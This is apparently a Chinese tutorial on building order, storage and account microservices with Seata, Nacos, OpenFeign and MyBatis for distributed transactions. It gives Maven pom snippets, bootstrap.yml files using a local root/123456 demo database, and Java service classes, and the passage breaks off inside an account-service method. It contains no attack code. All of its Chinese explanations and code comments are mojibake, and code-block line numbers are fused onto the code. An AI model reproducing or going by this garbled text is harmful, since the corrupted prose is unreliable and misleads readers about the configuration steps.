&lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;junit.version&gt;4.12&lt;/junit.version&gt; &lt;log4j.version&gt;1.2.17&lt;/log4j.version&gt; &lt;mysql.version&gt;8.0.21&lt;/mysql.version&gt; &lt;spring.cloud.version&gt;Hoxton.SR8&lt;/spring.cloud.version&gt; &lt;spring.boot.version&gt;2.3.2.RELEASE&lt;/spring.boot.version&gt; &lt;spring.cloud.alibaba&gt;2.2.3.RELEASE&lt;/spring.cloud.alibaba&gt; &lt;seata.spring.boot.version&gt;1.4.0&lt;/seata.spring.boot.version&gt; &lt;druid.spring.boot.version&gt;1.2.4&lt;/druid.spring.boot.version&gt; &lt;mybatis.spring.boot.version&gt;2.1.3&lt;/mybatis.spring.boot.version&gt;&lt;/properties&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;!--spring boot--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring.boot.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!--spring cloud--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring.cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!--spring cloud alibaba--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring.cloud.alibaba}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!--mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;${mysql.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--druid--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${druid.spring.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${mybatis.spring.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--log4j--&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;${log4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt; 5ã€åˆ›å»ºè®¢å•å·¥ç¨‹5.1ã€åˆ›å»º pom.xml â˜…è®¢å•å·¥ç¨‹çš„ Maven é…ç½®â˜… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;parent&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-transaction-demo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;!--seata-common-api--&gt; &lt;dependency&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-common-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;!--nacos config--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--nacos discovery--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--seata--&gt; &lt;dependency&gt; &lt;!-- é˜¿é‡Œå·´å·´å·²ç»é›†æˆæœåŠ¡é—´è°ƒç”¨X-idçš„ä¼ é€’ï¼ŒåŒ…æ‹¬FeignClientçš„é‡å†™ï¼Œå¦‚æœåœ¨ä¹‹å‰è‡ªå®šä¹‰å°è£…è¿‡Feignï¼Œæ³¨æ„ä¸¤è€…ä¹‹é—´çš„å†²çª--&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-seata&lt;/artifactId&gt; &lt;exclusions&gt; &lt;!--å»é™¤é»˜è®¤ä¾èµ–çš„ç‰ˆæœ¬--&gt; &lt;exclusion&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;!-- æŒ‡å®šSeataçš„ç‰ˆæœ¬ï¼Œéœ€è¦ä¸SeataæœåŠ¡ç«¯çš„ç‰ˆæœ¬ä¿æŒä¸€è‡´--&gt; &lt;dependency&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${seata.spring.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--openfeign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--web--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--actuator--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--druid--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 5.2ã€åˆ›å»º bootstrap.ymlSeata 1.1.0 ç‰ˆæœ¬ä¹‹åå®¢æˆ·ç«¯å·²ç»æ”¯æŒç”¨ YAML æ–‡ä»¶æ›¿ä»£ xxxx.conf æ–‡ä»¶ã€‚ä»¥ä¸‹ bootstrap.yml ç”±äºæ·»åŠ äº† seata.registry æ¥é…ç½® Seata Server æ‰€ä½¿ç”¨çš„æ³¨å†Œä¸­å¿ƒï¼Œå› æ­¤ä¸å†éœ€è¦æ‹·è´ Seata Server çš„ registry.conf é…ç½®æ–‡ä»¶æ‹·åˆ°æ¯ä¸ª Maven å­å·¥ç¨‹çš„ src/main/resource ç›®å½•ä¸‹ã€‚ ç‰¹åˆ«æ³¨æ„ï¼šbootstrap.yml ä¸­çš„ Seata é…ç½®é¡¹ï¼Œå¿…é¡»ä¸¥æ ¼ä¸ Seata Server çš„ registry.confã€file.conf çš„é…ç½®ä¸€è‡´ï¼Œå¦åˆ™ä¼šå¯¼è‡´åº”ç”¨å¯åŠ¨åæ— æ³•æ­£å¸¸è¿æ¥ Seata Server seata.registry.nacos.group å¿…é¡»ä¸ Seata Server çš„ registry.conf ä¸­çš„ registry.nacos.group ä¸€è‡´ seata.registry.nacos.namespace å¿…é¡»ä¸ Seata Server çš„ registry.conf ä¸­çš„ registry.nacos.namespace ä¸€è‡´ seata.registry.nacos.server-addr å¿…é¡»ä¸ Seata Server çš„ registry.conf ä¸­çš„ registry.nacos.serverAddr ä¸€è‡´ seata.registry.nacos.application å¿…é¡»ä¸ Seata Server çš„ registry.conf ä¸­çš„ registry.nacos.application ä¸€è‡´ seata.tx-service-group å¿…é¡»ä¸ Seata Server çš„ file.conf ä¸­çš„ service.vgroupMapping.xxxx = "default" çš„ xxxx ä¸€è‡´ åœ¨ file.conf é‡Œï¼Œservice.vgroupMapping.xxxx = "default" æ”¯æŒé…ç½®å¤šä¸ªï¼Œå¯¹åº”çš„å°±æ˜¯å¤šä¸ªå¾®æœåŠ¡åº”ç”¨ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061nacos: # Nacosçš„åœ°å€ server-addr: 127.0.0.1:8848 # Nacosçš„å‘½åç©ºé—´ namespace: ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d # Nacosçš„é…ç½®åˆ†ç»„ group: seata_demo # Seata Serverçš„é…ç½® seata: application: seata-server tx-service-group: seata-order-service-tx-group####### ä»¥ä¸Šæ˜¯è‡ªå®šä¹‰é…ç½®ä¸­å¿ƒå’Œæ³¨å†Œä¸­å¿ƒçš„å…±åŒå±æ€§ï¼Œæ–¹ä¾¿å…¶ä»–åœ°æ–¹ç›´æ¥å¼•ç”¨ #######server: port: 2001spring: application: name: seata-order-service cloud: nacos: discovery: server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/seata_order?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false username: root password: 123456mybatis: mapperLocations: classpath*:mapper/*.xml type-aliases-package: com.seata.study.domainseata: enabled: true application-id: ${spring.application.name} tx-service-group: ${nacos.seata.tx-service-group} enable-auto-data-source-proxy: false registry: type: nacos nacos: application: ${nacos.seata.application} server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} username: "" password: "" config: type: filefeign: hystrix: enabled: falselogging: level: io: seata: info 5.3ã€æ³¨å…¥ä»£ç†æ•°æ®æºSeata é€šè¿‡ä»£ç†æ•°æ®æºçš„æ–¹å¼å®ç°åˆ†æ”¯äº‹åŠ¡ï¼Œå…¶ä¸­ MyBatis å’Œ JPA éƒ½éœ€è¦æ³¨å…¥ io.seata.rm.datasource.DataSourceProxy, ä¸åŒçš„æ˜¯ï¼ŒMyBatis è¿˜éœ€è¦é¢å¤–æ³¨å…¥ org.apache.ibatis.session.SqlSessionFactoryã€‚åœ¨ Spring Boot Seata Starter 2.2.0.RELEASE åŠä»¥åç‰ˆæœ¬ï¼Œä»£ç†æ•°æ®æºçš„æ³¨å…¥ Seata å·²ç»è‡ªåŠ¨å®ç°äº†ï¼Œå³ä¸éœ€è¦å†æ‰‹åŠ¨å»é…ç½®ã€‚è‹¥å¸Œæœ› Seata è‡ªåŠ¨æ³¨å…¥ä»£ç†æ•°æ®æºï¼Œéœ€è¦åœ¨å·¥ç¨‹é‡Œçš„ file.conf é…ç½®æ–‡ä»¶æ·»åŠ  support.spring.datasource.autoproxy=trueï¼Œæ‰‹åŠ¨å®ç°çš„æ–¹å¼å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930@Configurationpublic class DataSourceProxyConfig { @Value("${mybatis.mapperLocations}") private String mapperLocations; @Value("${mybatis.type-aliases-package}") private String typeAliasesPackage; @Bean @ConfigurationProperties(prefix = "spring.datasource") public DataSource dataSource() { return new DruidDataSource(); } @Bean public DataSourceProxy dataSourceProxy(DataSource dataSource) { return new DataSourceProxy(dataSource); } @Bean public SqlSessionFactory sqlSessionFactory(DataSourceProxy dataSourceProxy) throws Exception { SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); sqlSessionFactoryBean.setDataSource(dataSourceProxy); sqlSessionFactoryBean.setMapperLocations(new PathMatchingResourcePatternResolver().getResources(mapperLocations)); sqlSessionFactoryBean.setTypeAliasesPackage(typeAliasesPackage); sqlSessionFactoryBean.setTransactionFactory(new SpringManagedTransactionFactory()); return sqlSessionFactoryBean.getObject(); }} 5.4ã€æ·»åŠ å…¨å±€äº‹åŠ¡æ³¨è§£åœ¨è®¢å•åˆ›å»ºçš„å…¥å£æ–¹æ³•ä¸Šé¢æ·»åŠ  @GlobalTransactional æ¥æ§åˆ¶åˆ†å¸ƒå¼äº‹åŠ¡ï¼Œè¿™é‡Œä½¿ç”¨ OpenFeign å»è°ƒç”¨åº“å­˜æœåŠ¡å’Œè´¦æˆ·æœåŠ¡çš„æ¥å£ 1234567891011121314151617181920212223242526@Servicepublic class OrderServiceImpl implements OrderService { @Resource private OrderMapper orderMapper; @Resource private AccountClient accountClient; @Resource private StorageClient storageClient; @Override @GlobalTransactional(name = "create-order", rollbackFor = Exception.class) public CommonResult createOrder(Order order) { // åˆ›å»ºè®¢å• orderMapper.create(order); // æ‰£å‡å•†å“åº“å­˜ storageClient.decrease(order.getProductId(), order.getCount()); // æ‰£å‡è´¦æˆ·ä½™é¢ accountClient.decrease(order.getUserId(), order.getMoney()); //æ›´æ–°è®¢å•çŠ¶æ€ orderMapper.update(order.getId(), OrderStatus.FINISHED.getValue()); return new CommonResult(); }} 5.5ã€åˆ›å»ºä¸»å¯åŠ¨ç±»123456789@SpringBootApplication(exclude = DataSourceAutoConfiguration.class)@EnableDiscoveryClient@EnableFeignClientspublic class OrderApplication { public static void main(String[] args) { SpringApplication.run(OrderApplication.class, args); }} 6ã€åˆ›å»ºåº“å­˜å·¥ç¨‹6.1ã€åˆ›å»º pom.xml â˜…åº“å­˜å·¥ç¨‹çš„ Maven é…ç½®â˜… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;parent&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-transaction-demo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;!--seata-common-api--&gt; &lt;dependency&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-common-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;!--nacos config--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--nacos discovery--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--seata--&gt; &lt;dependency&gt; &lt;!-- é˜¿é‡Œå·´å·´å·²ç»é›†æˆæœåŠ¡é—´è°ƒç”¨X-idçš„ä¼ é€’ï¼ŒåŒ…æ‹¬FeignClientçš„é‡å†™ï¼Œå¦‚æœåœ¨ä¹‹å‰è‡ªå®šä¹‰å°è£…è¿‡Feignï¼Œæ³¨æ„ä¸¤è€…ä¹‹é—´çš„å†²çª--&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-seata&lt;/artifactId&gt; &lt;exclusions&gt; &lt;!--å»é™¤é»˜è®¤ä¾èµ–çš„ç‰ˆæœ¬--&gt; &lt;exclusion&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;!-- æŒ‡å®šSeataçš„ç‰ˆæœ¬ï¼Œéœ€è¦ä¸SeataæœåŠ¡ç«¯çš„ç‰ˆæœ¬ä¿æŒä¸€è‡´--&gt; &lt;dependency&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${seata.spring.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--openfeign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--web--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--actuator--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--druid--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 6.2ã€åˆ›å»º bootstrap.yml12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061nacos: # Nacosçš„åœ°å€ server-addr: 127.0.0.1:8848 # Nacosçš„å‘½åç©ºé—´ namespace:ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d # Nacosçš„é…ç½®åˆ†ç»„ group: seata_demo # Seata Serverçš„é…ç½® seata: application: seata-server tx-service-group: seata-storage-service-tx-group####### ä»¥ä¸Šæ˜¯è‡ªå®šä¹‰é…ç½®ä¸­å¿ƒå’Œæ³¨å†Œä¸­å¿ƒçš„å…±åŒå±æ€§ï¼Œæ–¹ä¾¿å…¶ä»–åœ°æ–¹ç›´æ¥å¼•ç”¨ #######server: port: 2000spring: application: name: seata-storage-service cloud: nacos: discovery: server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/seata_storage?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false username: root password: 123456mybatis: mapperLocations: classpath*:mapper/*.xml type-aliases-package: com.seata.study.domainseata: enabled: true application-id: ${spring.application.name} tx-service-group: ${nacos.seata.tx-service-group} enable-auto-data-source-proxy: false registry: type: nacos nacos: application: ${nacos.seata.application} server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} username: "" password: "" config: type: filefeign: hystrix: enabled: falselogging: level: io: seata: info 6.3ã€æ³¨å…¥ä»£ç†æ•°æ®æº â˜…ä»£ç†æ•°æ®æºæ³¨å…¥ä»£ç â˜… 123456789101112131415161718192021222324252627282930@Configurationpublic class DataSourceProxyConfig { @Value("${mybatis.mapperLocations}") private String mapperLocations; @Value("${mybatis.type-aliases-package}") private String typeAliasesPackage; @Bean @ConfigurationProperties(prefix = "spring.datasource") public DataSource dataSource() { return new DruidDataSource(); } @Bean public DataSourceProxy dataSourceProxy(DataSource dataSource) { return new DataSourceProxy(dataSource); } @Bean public SqlSessionFactory sqlSessionFactory(DataSourceProxy dataSourceProxy) throws Exception { SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); sqlSessionFactoryBean.setDataSource(dataSourceProxy); sqlSessionFactoryBean.setMapperLocations(new PathMatchingResourcePatternResolver().getResources(mapperLocations)); sqlSessionFactoryBean.setTypeAliasesPackage(typeAliasesPackage); sqlSessionFactoryBean.setTransactionFactory(new SpringManagedTransactionFactory()); return sqlSessionFactoryBean.getObject(); }} 6.4ã€åˆ›å»ºä¸šåŠ¡å¤„ç†ç±»123456789101112131415161718192021222324252627@Servicepublic class StorageServiceImpl implements StorageService { @Resource private StorageMapper storageMapper; @Override public CommonResult decrease(Long productId, Long count) { Storage storage = storageMapper.findByProduct(productId); Long total = storage.getTotal(); Long used = storage.getUsed(); Long residue = storage.getResidue(); // æ ¡éªŒå‚æ•° if (count == null || count &lt;= 0) { return new CommonResult(SystemCode.ERROR_PARAMETER); } // åˆ¤æ–­åº“å­˜æ˜¯å¦è¶³å¤Ÿ if (count &gt; residue) { return new CommonResult(SystemCode.STORAGE_NOT_ENOUGH); } // æ‰£å‡åº“å­˜ storage.setUsed(used + count); storage.setResidue(residue - count); storageMapper.update(storage); return new CommonResult(); }} 6.5ã€åˆ›å»ºå¯åŠ¨ä¸»ç±»123456789@SpringBootApplication@EnableDiscoveryClient@EnableFeignClientspublic class StorageApplication { public static void main(String[] args) { SpringApplication.run(StorageApplication.class, args); }} 7ã€åˆ›å»ºè´¦æˆ·å·¥ç¨‹7.1ã€åˆ›å»º pom.xml â˜…è´¦æˆ·å·¥ç¨‹çš„ Maven é…ç½®â˜… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;parent&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-transaction-demo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;!--seata-common-api--&gt; &lt;dependency&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-common-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;!--nacos config--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--nacos discovery--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--seata--&gt; &lt;dependency&gt; &lt;!-- é˜¿é‡Œå·´å·´å·²ç»é›†æˆæœåŠ¡é—´è°ƒç”¨X-idçš„ä¼ é€’ï¼ŒåŒ…æ‹¬FeignClientçš„é‡å†™ï¼Œå¦‚æœåœ¨ä¹‹å‰è‡ªå®šä¹‰å°è£…è¿‡Feignï¼Œæ³¨æ„ä¸¤è€…ä¹‹é—´çš„å†²çª--&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-seata&lt;/artifactId&gt; &lt;exclusions&gt; &lt;!--å»é™¤é»˜è®¤ä¾èµ–çš„ç‰ˆæœ¬--&gt; &lt;exclusion&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;!-- æŒ‡å®šSeataçš„ç‰ˆæœ¬ï¼Œéœ€è¦ä¸SeataæœåŠ¡ç«¯çš„ç‰ˆæœ¬ä¿æŒä¸€è‡´--&gt; &lt;dependency&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${seata.spring.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--openfeign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--web--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--actuator--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--druid--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 7.2ã€åˆ›å»º bootstrap.yml12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061nacos: # Nacosçš„åœ°å€ server-addr: 127.0.0.1:8848 # Nacosçš„å‘½åç©ºé—´ namespace:ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d # Nacosçš„é…ç½®åˆ†ç»„ group: seata_demo # Seata Serverçš„é…ç½® seata: application: seata-server tx-service-group: seata-account-service-tx-group####### ä»¥ä¸Šæ˜¯è‡ªå®šä¹‰é…ç½®ä¸­å¿ƒå’Œæ³¨å†Œä¸­å¿ƒçš„å…±åŒå±æ€§ï¼Œæ–¹ä¾¿å…¶ä»–åœ°æ–¹ç›´æ¥å¼•ç”¨ #######server: port: 2002spring: application: name: seata-account-service cloud: nacos: discovery: server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/seata_account?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false username: root password: 123456mybatis: mapperLocations: classpath*:mapper/*.xml type-aliases-package: com.seata.study.domainseata: enabled: true application-id: ${spring.application.name} tx-service-group: ${nacos.seata.tx-service-group} enable-auto-data-source-proxy: false registry: type: nacos nacos: application: ${nacos.seata.application} server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} username: "" password: "" config: type: filefeign: hystrix: enabled: falselogging: level: io: seata: info 7.3ã€æ³¨å…¥ä»£ç†æ•°æ®æº â˜…ä»£ç†æ•°æ®æºæ³¨å…¥ä»£ç â˜… 123456789101112131415161718192021222324252627282930@Configurationpublic class DataSourceProxyConfig { @Value("${mybatis.mapperLocations}") private String mapperLocations; @Value("${mybatis.type-aliases-package}") private String typeAliasesPackage; @Bean @ConfigurationProperties(prefix = "spring.datasource") public DataSource dataSource() { return new DruidDataSource(); } @Bean public DataSourceProxy dataSourceProxy(DataSource dataSource) { return new DataSourceProxy(dataSource); } @Bean public SqlSessionFactory sqlSessionFactory(DataSourceProxy dataSourceProxy) throws Exception { SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); sqlSessionFactoryBean.setDataSource(dataSourceProxy); sqlSessionFactoryBean.setMapperLocations(new PathMatchingResourcePatternResolver().getResources(mapperLocations)); sqlSessionFactoryBean.setTypeAliasesPackage(typeAliasesPackage); sqlSessionFactoryBean.setTransactionFactory(new SpringManagedTransactionFactory()); return sqlSessionFactoryBean.getObject(); }} 7.4ã€åˆ›å»ºä¸šåŠ¡å¤„ç†ç±»è¿™é‡Œæ·»åŠ äº†æ¨¡æ‹Ÿè´¦æˆ·ä¸šåŠ¡å¤„ç†è¶…æ—¶çš„ä»£ç ï¼Œå»¶æ—¶æ—¶é—´ä¸º 10 ç§’ã€‚å› ä¸º OpenFeign çš„é»˜è®¤è¶…æ—¶æ—¶é—´ä¸º 1 ç§’ï¼Œæ‰€ä»¥å½“è®¢å•æœåŠ¡è¿œç¨‹è°ƒç”¨è´¦æˆ·æœåŠ¡æ¥æ‰£å‡è´¦æˆ·ä½™é¢æ—¶ï¼Œä¼šæŠ›å‡ºè¯·æ±‚è¶…æ—¶çš„å¼‚å¸¸ï¼Œè¿™æ—¶å°±å¯ä»¥æµ‹è¯•å…¨å±€äº‹åŠ¡æ³¨è§£ @GlobalTransactional æ˜¯å¦ç”Ÿæ•ˆäº†ã€‚è‹¥ @GlobalTransactional ç”Ÿæ•ˆï¼Œå½“è®¢å•æœåŠ¡çš„è¿œç¨‹è°ƒç”¨æŠ›å‡ºè¯·æ±‚è¶…æ—¶çš„å¼‚å¸¸åï¼Œè´¦æˆ·æ•°æ®åº“é‡Œå¯¹åº”çš„è´¦æˆ·ä½™é¢ä¸ä¼šè¢«ä¿®æ”¹ï¼›è‹¥è´¦æˆ·ä½™é¢è¢«ä¿®æ”¹äº†ï¼Œåˆ™è¯´æ˜ @GlobalTransactional æ²¡æœ‰ç”Ÿæ•ˆã€‚ 12345678910111213141516171819202122232425262728293031323334@Servicepublic class AccountServiceImpl implements AccountService { @Resource private AccountMapper accountMapper; @Override public CommonResult decrease(Long userId, BigDecimal money) { Account account = accountMapper.findByUser(userId); BigDecimal total = account.getTotal(); BigDecimal used = account.getUsed(); BigDecimal residue = account.getResidue(); // æ¨¡æ‹Ÿä¸šåŠ¡å¤„ç†è¶…æ—¶ try 